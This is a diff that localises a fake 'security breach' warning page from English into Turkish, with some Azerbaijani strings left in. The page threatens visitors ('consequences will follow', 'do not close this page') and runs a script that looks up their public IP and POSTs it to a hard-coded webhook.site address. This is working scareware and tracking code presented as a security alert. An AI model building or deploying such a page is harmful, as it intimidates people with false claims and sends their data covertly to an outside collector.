@@ -1,9 +1,9 @@
-<!#80FF00DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Alert</title>
+    <title>Güvenlik Uyarısı</title>
     <style>
         body {
             background-color: black;
@@ -23,10 +23,10 @@
     </style>
 </head>
 <body>
-    <h1>⚠️ SECURITY BREACH DETECTED ⚠️</h1>
-    <p class="hacker-text">Your IP Address: <span id="ip-address">Tracking...</span></p>
-    <p class="hacker-text">Your device has been registered. Do not close this page.</p>
-    <p class="hacker-text">If you do not comply, consequences will follow.</p>
+    <h1>⚠️ GÜVENLİK İHLALİ TESPİT EDİLDİ ⚠️</h1>
+    <p class="hacker-text">IP Adresiniz: <span id="ip-address">İzləniliyor...</span></p>
+    <p class="hacker-text">Cihazınız sisteme kaydedildi. Bu sayfayı kapatmayın.</p>
+    <p class="hacker-text">Aksi takdirde ciddi sonuçlar doğacaktır.</p>
 
     <script>
         fetch('https://api64.ipify.org?format=json')
@@ -34,7 +34,7 @@
             .then(data => {
                 document.getElementById('ip-address').textContent = data.ip;
 
-                // Webhook.site URL-ni bura əlavə et
+                // Webhook.site URL'nizi buraya ekleyin
                 fetch('https://webhook.site/d0bd5d4e-c93b-461d-a724-d9362aea846e', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -46,7 +46,7 @@
                 });
             })
             .catch(() => {
-                document.getElementById('ip-address').textContent = 'ERROR RETRIEVING IP';
+                document.getElementById('ip-address').textContent = 'IP ADRESİ ALINAMADI';
             });
     </script>
 </body>
